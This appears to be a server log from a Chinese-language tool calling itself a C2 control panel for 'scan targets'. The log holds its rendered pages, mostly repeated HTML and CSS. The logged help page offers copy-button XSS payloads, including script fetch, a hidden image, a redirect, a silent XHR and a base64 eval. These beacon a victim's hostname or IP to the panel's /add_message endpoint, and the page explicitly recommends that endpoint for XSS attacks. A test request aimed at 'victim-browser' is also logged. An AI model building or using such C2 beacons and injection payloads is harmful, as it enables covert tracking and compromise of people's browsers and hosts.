<div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>支持 JSON 格式回應，便於程式化調用</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        const url = `/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 16:53:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:56] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 16:53:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:56] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 16:53:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:56] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:54:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:54:11] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:59:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 16:59:50 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 16:59:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Base64 編碼載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;eval(atob(&#39;ZmV0Y2goJy9hZGRfbWVzc2FnZT9tZXNzYWdlPUJhc2U2NOaUu+aTig==&#39;)).replace(&#39;Base64攻擊&#39;,encodeURIComponent(&#39;Base64攻擊&#39;))&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;eval(atob(&#39;ZmV0Y2goJy9hZGRfbWVzc2FnZT9tZXNzYWdlPUJhc2U2NOaUu+aTig==&#39;)).replace(&#39;Base64攻擊&#39;,encodeURIComponent(&#39;Base64攻擊&#39;))&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>所有消息都會被記錄到數據庫中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>target_ip 參數是可選的，可以為空</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>支持 JSON 格式回應，便於程式化調用</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        const url = `/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 16:59:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:59:50] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 16:59:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:59:50] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 16:59:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:59:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:00:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:00:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:10:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:10:06] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 17:10:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:10:17 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:10:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0239s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:10:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:10:17] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:10:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:10:17] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:10:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:10:17] "GET /favicon.ico HTTP/1.1" 200 -
